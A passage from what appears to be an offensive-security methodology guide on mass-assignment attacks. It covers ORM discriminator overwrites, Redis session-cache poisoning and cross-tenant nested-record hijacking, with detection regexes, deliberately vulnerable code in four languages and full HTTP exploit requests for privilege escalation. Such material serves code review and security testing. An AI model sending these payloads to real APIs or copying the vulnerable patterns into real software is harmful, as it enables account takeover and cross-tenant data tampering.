{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\.HasDiscriminator<string>\("|\bHasDiscriminator\(".*type|HasValue\(".*"
```
{% endtab %}

{% tab title="Java" %}
```regexp
@DiscriminatorColumn\(name\s*=\s*"|@DiscriminatorValue\(name|@Inheritance\(strategy
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$table->string\('type'\)->default\('|morphMap\(|Relation::morphMap
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+Schema\(\{.*\},\s*\{\s*discriminatorKey:\s*'|discriminatorKey\s*:
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPatch("/api/v1/users/me")]
public async Task<IActionResult> UpdateProfile([FromBody] Dictionary<string, object> updates)
{
    var userId = User.GetUserId();
    
    // [1]
    // [2]
    // Base class queried. The database uses Table-Per-Hierarchy (TPH).
    var currentUser = await _dbContext.Users.FindAsync(userId);

    // [3]
    // [4]
    // Dynamic property application bypassing strict DTO mapping
    var json = JsonConvert.SerializeObject(updates);
    JsonConvert.PopulateObject(json, currentUser);

    // Entity Framework tracks the change to the hidden "UserType" discriminator column
    await _dbContext.SaveChangesAsync();

    return Ok(currentUser);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class UserProfileController {

    @Autowired
    private UserRepository userRepository;

    @PatchMapping("/api/v1/users/me")
    public ResponseEntity<?> updateProfile(@RequestBody Map<String, Object> updates, Principal principal) throws Exception {
        // [1]
        // [2]
        User currentUser = userRepository.findById(principal.getName()).orElseThrow();

        // [3]
        // [4]
        // Jackson updates the memory reference, applying changes to the @DiscriminatorColumn
        ObjectMapper mapper = new ObjectMapper();
        mapper.readerForUpdating(currentUser).readValue(mapper.writeValueAsBytes(updates));

        userRepository.save(currentUser);

        return ResponseEntity.ok().build();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class UserProfileController extends Controller
{
    public function updateProfile(Request $request)
    {
        // [1]
        // [2]
        $user = auth()->user();

        // [3]
        // [4]
        // Developer blindly passes the request array into the Eloquent update method.
        // If 'type' is in the $fillable array (or if model is unguarded), the discriminator is overwritten.
        $user->update($request->all());

        return response()->json($user);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.patch('/api/v1/users/me', async (req, res) => {
    // [1]
    // [2]
    // Mongoose Model uses discriminatorKey: '__t'
    let currentUser = await User.findById(req.user.id);

    // [3]
    // [4]
    // Lodash merge pushes the attacker's __t key directly into the Mongoose document
    const _ = require('lodash');
    _.merge(currentUser, req.body);

    // Mongoose saves the modified __t column to MongoDB
    await currentUser.save();

    res.send(currentUser);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The database utilizes a Single-Table Inheritance design, mapping multiple programmatic subclasses (e.g., Admin, User, Moderator) into a single physical table using a discriminator column, \[2] The backend endpoint retrieves the user's base entity representation from the database, \[3] To support rapid frontend development and flexible profile structures, the API accepts a dynamic JSON payload rather than enforcing a rigid, type-safe Data Transfer Object (DTO), \[4] The execution sink. The dynamic mapping utility blindly iterates over the input keys. Because the discriminator column (e.g., `__t` or `UserType`) is a native property of the underlying ORM model, the utility successfully binds the attacker's value to the metadata field. The ORM persists this state transition, permanently re-classifying the attacker's row into a highly privileged subclass entity

```http
// 1. Attacker authenticates as a standard user.
// 2. Attacker interacts with a generic PATCH endpoint designed to update their profile bio.
// 3. Attacker injects the ORM discriminator key corresponding to the administrative subclass.

PATCH /api/v1/users/me HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <standard_user_token>
Content-Type: application/json

{
  "bio": "Standard user profile.",
  "__t": "EnterpriseAdminUser",
  "UserType": "Admin" 
}

// 4. The dynamic update utility merges the payload, writing "Admin" into the discriminator column.
// 5. The API returns 200 OK.
// 6. The attacker deletes their JWT/Cookie and logs back in.
// 7. During authentication, the ORM executes: SELECT * FROM Users WHERE id = 123.
// 8. The ORM detects UserType = 'Admin', instantiates an EnterpriseAdminUser object, 
//    and issues a JWT containing massive administrative claims.
```
{% endstep %}

{% step %}
To support complex multi-role architectures without sprawling database tables, developers implemented Single-Table Inheritance managed exclusively by the ORM's internal discriminator logic. By implementing a dynamic Mass Assignment pipeline for profile updates, they assumed that restricting the endpoint to the active user's ID was sufficient to guarantee execution safety. They failed to recognize that the ORM's structural metadata columns are natively exposed to dynamic object mappers. The attacker exploited this by injecting the specific discriminator string used by the platform. The mapping utility overrode the entity's fundamental type classification in memory, which the ORM dutifully persisted to the database. Upon re-authentication, the ORM's hydration engine honored the poisoned discriminator, elevating the attacker's session context to a completely different, highly privileged programmatic class
{% endstep %}
{% endstepper %}

***

#### Session Poisoning via Desynchronized Cache-Hydration Mass Assignment

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-throughput platforms that aggressively leverage in-memory data grids (e.g., Redis, Memcached) to store active user sessions or profile definitions
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Database Write-Through Caching" architecture. To ensure multi-region performance, the API Gateway never queries the SQL database to determine a user's permissions or profile details. Instead, it reads a serialized JSON object directly from Redis.
{% endstep %}

{% step %}
nvestigate the profile update lifecycle. When a user updates their profile, the backend microservice must accomplish two tasks: 1) Update the authoritative SQL database, and 2) Invalidate or update the Redis cache so the user instantly sees their changes
{% endstep %}

{% step %}
Analyze the relational database pipeline. The developer properly secures the SQL `UPDATE` statement. They explicitly map the incoming JSON payload into a strict Data Transfer Object (DTO), ensuring that a payload containing `"isAdmin": true` is safely dropped before hitting the database
{% endstep %}

{% step %}
Discover the fatal Cache-Hydration desynchronization: Updating the SQL database is heavily restricted, but updating the Redis cache is treated as a secondary, "untrusted" performance optimization. To avoid executing a costly `SELECT` statement after the `UPDATE` to re-fetch the user's data, the developer dynamically patches the _existing_ cached JSON object in memory using the raw, unmapped HTTP request body
{% endstep %}

{% step %}
Understand the architectural gap: The application possesses two completely disparate data pipelines. The strict SQL pipeline guarantees long-term data integrity, while the loose Cache pipeline governs the immediate execution context
{% endstep %}

{% step %}
Formulate the Cache Poisoning Mass Assignment payload. Send a `PATCH` request to the profile endpoint containing both legitimate profile data and a highly privileged state mutation (e.g., `{"theme": "dark", "roles": ["super_admin"]}`)
{% endstep %}

{% step %}
The backend strict DTO parser filters out `"roles"` and securely updates the SQL database with `theme = 'dark'`
{% endstep %}

{% step %}
The backend's cache-update routine executes. It pulls the active Redis JSON string, parses it into an untyped dictionary, and merges the _raw_ HTTP request body (which still contains `"roles": ["super_admin"]`) directly into the object. It serializes the poisoned object and saves it back to Redis
{% endstep %}

{% step %}
The vulnerability is now fully weaponized in the ephemeral layer
{% endstep %}

{% step %}
Execute a subsequent request to a highly restricted administrative endpoint (e.g., `/api/admin/billing`)
{% endstep %}

{% step %}
The API Gateway queries Redis for your session context. It receives the poisoned JSON object containing the `super_admin` role
{% endstep %}

{% step %}
Because the Gateway inherently trusts the internal Redis cache as the ultimate source of truth, it evaluates the injected roles and grants you full unauthenticated access to the administrative microservice mesh

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:_cache\.SetStringAsync\s*\([\s\S]{0,150}?JsonConvert\.SerializeObject\s*\([\s\S]{0,120}?(?:Merge|PopulateObject|DeserializeObject)|JsonConvert\.SerializeObject\s*\([\s\S]{0,120}?Merge\s*\(|(?:cache|redis).*Set.*SerializeObject.*Merge)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:redisTemplate\.opsForValue\(\)\.set\s*\([\s\S]{0,150}?objectMapper\.(?:readerForUpdating|updateValue|convertValue)|objectMapper\.readerForUpdating\s*\([\s\S]{0,120}?(?:cache|redis|object)|RedisTemplate[\s\S]{0,150}?set)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Cache::put\s*\([\s\S]{0,150}?array_replace_recursive\s*\(|array_replace_recursive\s*\([\s\S]{0,150}?(?:cache|user|session)|\$cache->put\s*\([\s\S]{0,120}?(?:merge|array_merge|array_replace))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:redis\.set\s*\([\s\S]{0,150}?Object\.assign\s*\(\s*(?:cachedUser|cached|cache|user)[\s\S]{0,100}?(?:req\.body|request\.body)|Object\.assign\s*\([\s\S]{0,120}?req\.body[\s\S]{0,100}?(?:redis|cache)|\bspread\b.*req\.body.*cache)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
_cache\.SetStringAsync\(.*JsonConvert\.SerializeObject\(.*Merge\(|JsonConvert\.SerializeObject\(.*Merge\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
redisTemplate\.opsForValue\(\)\.set\(.*objectMapper\.readerForUpdating|readerForUpdating\(.*redis|objectMapper.*updateValue
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Cache::put\(.*array_replace_recursive\(|array_replace_recursive\(.*cache|array_merge\(.*cache
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
redis\.set\(.*Object\.assign\(cachedUser,\s*req\.body\)|Object\.assign\(.*req\.body.*cache
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPatch("/api/v1/profile")]
public async Task<IActionResult> UpdateProfile([FromBody] UserUpdateDto safeDto)
{
    var userId = User.GetUserId();
    
    // [1]
    // The database update is completely secure. The DTO drops any "Roles" or "IsAdmin" fields.
    var user = await _dbContext.Users.FindAsync(userId);
    user.Theme = safeDto.Theme;
    user.Bio = safeDto.Bio;
    await _dbContext.SaveChangesAsync();

    // [2]
    // [3]
    // Fatal Optimization: Instead of reading the fresh record from the DB to update Redis,
    // the developer merges the RAW request body into the cached session to save a SQL round-trip.
    var cachedData = await _cache.GetStringAsync($"session:{userId}");
    var sessionObj = JObject.Parse(cachedData);
    
    using (var reader = new StreamReader(Request.Body))
    {
        Request.Body.Position = 0;
        var rawBody = await reader.ReadToEndAsync();
        var rawJson = JObject.Parse(rawBody);
        
        // [4]
        sessionObj.Merge(rawJson, new JsonMergeSettings { MergeArrayHandling = MergeArrayHandling.Union });
        await _cache.SetStringAsync($"session:{userId}", sessionObj.ToString());
    }

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PatchMapping("/api/v1/profile")
public ResponseEntity<?> updateProfile(@RequestBody UserUpdateDto safeDto, HttpServletRequest request) throws Exception {
    String userId = getUserId();
    
    // [1]
    // Secure SQL Update
    User user = userRepository.findById(userId).orElseThrow();
    user.setTheme(safeDto.getTheme());
    user.setBio(safeDto.getBio());
    userRepository.save(user);

    // [2]
    // [3]
    // Cache Hydration Desynchronization
    String cachedData = redisTemplate.opsForValue().get("session:" + userId);
    ObjectMapper mapper = new ObjectMapper();
    
    // Reads the raw InputStream containing the attacker's un-filtered mass assignment payload
    String rawBody = request.getReader().lines().collect(Collectors.joining(System.lineSeparator()));
    
    // [4]
    ObjectReader updater = mapper.readerForUpdating(mapper.readTree(cachedData));
    JsonNode poisonedSession = updater.readValue(rawBody);
    
    redisTemplate.opsForValue().set("session:" + userId, mapper.writeValueAsString(poisonedSession));

    return ResponseEntity.ok().build();
}
```


{% endtab %}

{% tab title="PHP" %}
```php
public function updateProfile(Request $request, UserUpdateRequest $safeRequest)
{
    // [1]
    $user = auth()->user();
    // Secure SQL Update via validated FormRequest DTO
    $user->update($safeRequest->validated());

    // [2]
    // [3]
    // Cache Desynchronization
    $cachedData = Cache::get("session:{$user->id}");
    
    // [4]
    // Merges the raw HTTP payload directly into the active session array
    $poisonedSession = array_replace_recursive($cachedData, $request->all());
    
    Cache::put("session:{$user->id}", $poisonedSession, 3600);

    return response()->json(['status' => 'updated']);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.patch('/api/v1/profile', async (req, res) => {
    // [1]
    // Secure SQL Update using explicit property extraction
    await User.update({ 
        theme: req.body.theme, 
        bio: req.body.bio 
    }, { where: { id: req.user.id } });

    // [2]
    // [3]
    let cachedSession = JSON.parse(await redis.get(`session:${req.user.id}`));
    
    // [4]
    // Fatal Object.assign with the raw req.body bypassing the SQL protections
    let poisonedSession = Object.assign(cachedSession, req.body);
    
    await redis.set(`session:${req.user.id}`, JSON.stringify(poisonedSession));

    res.send({ status: 'updated' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application effectively neutralizes standard Mass Assignment attacks at the database layer by employing strict Data Transfer Objects (DTOs) or explicit property mapping, \[2] The architecture relies heavily on Redis to store stateless JWT session context, enabling lightning-fast access control checks without generating SQL load, \[3] To eliminate unnecessary database reads (`SELECT`) following a write operation, the developer optimizes the cache invalidation process. Instead of tearing down the cache, they dynamically merge the incoming changes into the existing cached object, \[4] The execution sink. The dynamic merge utility consumes the _raw_, untyped HTTP request body rather than the sanitized DTO. The attacker's Mass Assignment payload successfully bypasses the SQL protections and overwrites the authorization claims inside the ephemeral cache. Because the API Gateway inherently trusts the Redis session cache, the attacker achieves immediate privilege escalation

```http
// 1. Attacker logs into the application and receives a standard user session.
// 2. Attacker crafts a PATCH request to a harmless profile endpoint.
// They inject a massive assignment payload targeting the session's authorization structure.

PATCH /api/v1/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <standard_user_token>
Content-Type: application/json

{
  "theme": "dark",
  "bio": "Security Researcher",
  "roles": ["Platform_Super_Admin"],
  "permissions": {"bypass_billing": true}
}

// 3. The Backend Strict DTO drops "roles" and "permissions". 
//    The SQL database is securely updated with the theme and bio.
// 4. The Backend Cache Hydrator merges the RAW JSON body into the active Redis session.
//    Redis now stores the poisoned roles and permissions.

// 5. Attacker executes a request to a highly protected internal endpoint:
GET /api/v1/admin/global-settings HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <standard_user_token>

// 6. The API Gateway queries Redis, evaluates the poisoned "roles" array, and grants access.
HTTP/1.1 200 OK
{
  "global_encryption_keys": "...",
  "active_tenants": 4123
}
```
{% endstep %}

{% step %}
To guarantee structural data integrity, backend engineers implemented rigid DTOs to govern all relational database mutations, successfully neutralizing traditional Mass Assignment vectors. However, to optimize read-heavy API Gateway routing, they deployed a highly distributed Redis session cache. The architectural flaw materialized during the synchronization of these two distinct data stores. To save micro-seconds of latency, developers bypassed the secure DTO pipeline when refreshing the Redis cache, instead merging the raw HTTP payload directly into the active session memory object. The attacker weaponized this pipeline asymmetry by embedding highly privileged authorization markers into an otherwise benign request. While the persistent database securely dropped the malicious attributes, the ephemeral cache blindly absorbed them. The gateway, trusting the cache as the absolute source of truth for access control, instantly validated the poisoned session, yielding complete horizontal and vertical privilege escalation without leaving anomalous footprints in the primary SQL database
{% endstep %}
{% endstepper %}

***

#### Cross-Tenant Record Hijacking via Unbound Nested Collection Synchronization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on complex entity management endpoints that handle hierarchical data structures (e.g., updating a `Company` and its nested array of `Locations`, or a `User` and their array of `PaymentMethods`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a "Disconnected Graph" update architecture. Modern frontend SPAs send the entire state of a parent object and its nested child collections in a single, massive JSON payload (e.g., `{"name": "Corp", "addresses": [{"id": 1, "street": "Main St"}, {"id": 2, "street": "Broadway"}]}`)
{% endstep %}

{% step %}
Investigate the ORM's collection synchronization mechanism. To avoid manually looping through arrays to determine which child records to `INSERT`, `UPDATE`, or `DELETE`, developers utilize the ORM's native Graph Synchronization capabilities (e.g., Entity Framework's `DbContext.Update()`, Hibernate's `CascadeType.ALL`, or Laravel's `sync()`)
{% endstep %}

{% step %}
Analyze the relational mapping logic. When the ORM receives the nested array, it checks the Primary Key (e.g., `"id": 1`) of each child object in the JSON. If the ID exists, it issues a SQL `UPDATE` statement. If the ID is 0 or null, it issues an `INSERT`. If an ID from the database is missing from the JSON, it issues a `DELETE`
{% endstep %}

{% step %}
Discover the boundary authorization failure: The developer meticulously ensures that the _Parent_ entity (e.g., the `Company`) belongs to the authenticated user. However, they explicitly trust that any child object IDs provided in the nested JSON array inherently belong to that authorized Parent. They fail to execute a cross-tenant ownership check on the nested Foreign Keys
{% endstep %}

{% step %}
Formulate the Cross-Tenant Hijacking payload. Create a legitimate update request for your own parent entity
{% endstep %}

{% step %}
Inside the nested collection array, inject the Primary Key (ID) of a highly sensitive child record belonging to a _different_ tenant or an administrative user (e.g., Target Victim's `BillingAddress` ID or `OAuthToken` ID)
{% endstep %}

{% step %}
Payload structure: `{"addresses": [{"id": VICTIM_RECORD_ID, "street": "Attacker Controlled String"}]}`
{% endstep %}

{% step %}
Submit the JSON graph payload to the API
{% endstep %}

{% step %}
The backend queries the database and verifies you own the Parent entity. Validation passes
{% endstep %}

{% step %}
The backend passes the unverified JSON graph into the ORM's synchronization utility
{% endstep %}

{% step %}
The ORM evaluates the nested array. It identifies the `VICTIM_RECORD_ID`. Because it is an update operation, the ORM bypasses standard creation constraints. It generates a SQL transaction: `UPDATE Addresses SET street = 'Attacker Controlled String', company_id = ATTACKER_COMPANY_ID WHERE id = VICTIM_RECORD_ID`
{% endstep %}

{% step %}
The transaction commits. You have successfully executed a Mass Assignment attack that not only overwrites the data of a cross-tenant record but forcibly re-parents the victim's record to your own organizational hierarchy, transferring ownership entirely

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:_dbContext\.Update\s*\([\s\S]{0,120}?(?:ParentEntity|Entity)|DbSet<.*>\.Update\s*\([\s\S]{0,120}?(?:Parent|Entity)|Entry\s*\([\s\S]{0,100}?\)\.State\s*=\s*EntityState\.Modified)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:session\.merge\s*\([\s\S]{0,120}?(?:parentEntity|ParentEntity)|entityManager\.merge\s*\([\s\S]{0,120}?(?:parent|entity)|save\s*\([\s\S]{0,100}?(?:parentEntity|child))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$user->addresses\(\)->sync\s*\([\s\S]{0,100}?(?:\$|request|input)|->sync\s*\([\s\S]{0,120}?\)|belongsToMany\s*\([\s\S]{0,100}?sync)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:ParentModel\.update\s*\([\s\S]{0,150}?\{\s*include\s*:\s*\[[\s\S]*?\]\s*\}|Model\.update\s*\([\s\S]{0,150}?include\s*:\s*\[|sequelize\.update\s*\([\s\S]{0,120}?include)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
_dbContext\.Update\(.*ParentEntity|DbSet<.*>\.Update\(.*Parent
```
{% endtab %}

{% tab title="Java" %}
```regexp
session\.merge\(.*parentEntity|entityManager\.merge\(.*parent
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$user->addresses\(\)->sync\(.*\)|belongsToMany.*sync
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
ParentModel\.update\(.*\{\s*include:\s*\[.*\]\s*\}|Model\.update\(.*include:
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPut("/api/v1/companies/{companyId}")]
public async Task<IActionResult> UpdateCompany(Guid companyId, [FromBody] CompanyUpdateDto payload)
{
    // [1]
    // Validates that the active user actually owns the Parent Company being updated.
    if (!await _authService.CanManageCompanyAsync(User.GetUserId(), companyId)) return Forbid();

    // [2]
    // [3]
    var company = new Company 
    { 
        Id = companyId, 
        Name = payload.Name,
        Addresses = payload.Addresses.Select(a => new Address { Id = a.Id, Street = a.Street }).ToList() 
    };

    // [4]
    // Entity Framework's DbContext.Update() processes the entire disconnected graph.
    // It issues UPDATE statements for any nested Address with a non-zero ID,
    // explicitly bypassing ownership checks on the nested child entities.
    _dbContext.Companies.Update(company);
    await _dbContext.SaveChangesAsync();

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class CompanyController {

    @Autowired
    private CompanyRepository companyRepo;

    @PutMapping("/api/v1/companies/{companyId}")
    @Transactional
    public ResponseEntity<?> updateCompany(@PathVariable UUID companyId, @RequestBody Company payload, Principal principal) {
        // [1]
        if (!authService.canManageCompany(principal.getName(), companyId)) return ResponseEntity.status(403).build();

        // [2]
        // [3]
        payload.setId(companyId);

        // [4]
        // Hibernate's Session.merge() or Repository.save() with CascadeType.ALL 
        // aggressively synchronizes the nested collections. If the payload contains an Address ID 
        // belonging to a different tenant, Hibernate issues an UPDATE, overwriting the row.
        companyRepo.save(payload);

        return ResponseEntity.ok().build();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class CompanyController extends Controller
{
    public function updateCompany(Request $request, $companyId)
    {
        // [1]
        $company = Company::findOrFail($companyId);
        if ($request->user()->cannot('update', $company)) {
            abort(403);
        }

        $company->update(['name' => $request->input('name')]);

        // [2]
        // [3]
        // [4]
        // Laravel's sync() or saveMany() methods evaluate the provided IDs.
        // If an attacker passes [991 => ['street' => 'Hacked']], the ORM updates 
        // Address ID 991, assigning it to the attacker's company, regardless of original ownership.
        $addressesData = $request->input('addresses', []);
        
        foreach ($addressesData as $address) {
            $company->addresses()->updateOrCreate(
                ['id' => $address['id'] ?? null],
                ['street' => $address['street']]
            );
        }

        return response()->json($company->load('addresses'));
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.put('/api/v1/companies/:companyId', async (req, res) => {
    // [1]
    let companyId = req.params.companyId;
    if (!await authService.canManageCompany(req.user.id, companyId)) return res.status(403).send('Forbidden');

    // [2]
    // [3]
    let payload = req.body;
    payload.id = companyId;

    // [4]
    // Sequelize update with 'include' instructs the ORM to synchronize nested models.
    // It trusts the 'id' fields in the payload.addresses array completely.
    await Company.upsert(payload, {
        include: [Address]
    });

    res.send({ status: 'success' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API correctly secures the primary execution boundary by enforcing a strict Tenant Ownership check against the requested Parent ID, \[2] The backend receives a "Disconnected Graph" from the frontend SPA, consisting of the parent object and an array of nested child objects, \[3] To eliminate thousands of lines of boilerplate required to diff arrays and determine which rows to update, developers map the raw payload directly into the ORM's native synchronization methods, \[4] The fatal boundary delegation. The developer implicitly assumes that the ORM will validate the parent-child relationship before executing an update. However, graph synchronization utilities are designed purely for data persistence, not authorization. They blindly read the nested Primary Key (`id`), construct a SQL `UPDATE` statement bound to that exact ID, and execute it. By injecting a victim's child ID, the attacker leverages nested Mass Assignment to arbitrarily overwrite unowned database records

```http
// 1. Attacker (Tenant A) identifies the ID of a highly sensitive asset belonging to Victim (Tenant B).
// For example, an OAuth Application configuration or a critical Delivery Address (ID: 9999).

// 2. Attacker interacts with their OWN Company update endpoint, which they are authorized to use.
// 3. Attacker injects the Victim's child record ID into the nested collection array.

PUT /api/v1/companies/ATTACKER_COMPANY_ID HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_a_token>
Content-Type: application/json

{
  "name": "Attacker Corp",
  "addresses": [
    {
      "id": 9999, 
      "street": "123 Attacker Controlled Drop Site"
    }
  ]
}

// 4. The backend verifies the attacker owns "ATTACKER_COMPANY_ID". Access Granted.
// 5. The backend ORM (e.g., EF Core or Hibernate) processes the disconnected graph.
// 6. The ORM generates the cross-tenant SQL queries:
//    UPDATE Companies SET Name = 'Attacker Corp' WHERE Id = 'ATTACKER_COMPANY_ID';
//    UPDATE Addresses SET Street = '123 Attacker Controlled Drop Site', CompanyId = 'ATTACKER_COMPANY_ID' WHERE Id = 9999;

// 7. The Victim's Address record is successfully overwritten. Furthermore, because the ORM synchronized 
//    the Foreign Key (CompanyId), the victim's record is permanently transferred to the attacker's organization.
```
{% endstep %}

{% step %}
To manage complex, hierarchical user interfaces efficiently, developers utilized native ORM disconnected graph synchronization. This architecture allowed the frontend to submit entire object trees in a single API call, relying on the backend ORM to automatically diff and generate the required SQL `INSERT`, `UPDATE`, and `DELETE` transactions. While engineers rigorously enforced authorization boundaries on the root parent entity, they fundamentally misunderstood the ORM's mechanical trust model regarding nested collections. The ORM assumed that any Primary Key defined within the nested array was an authoritative instruction to modify that specific database row. The attacker exploited this semantic gap by packaging a target victim's child ID within an authorized parent request. The ORM bypassed cross-tenant hierarchy checks, executing a localized Mass Assignment attack that silently hijacked and re-parented the victim's relational data into the attacker's namespace
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
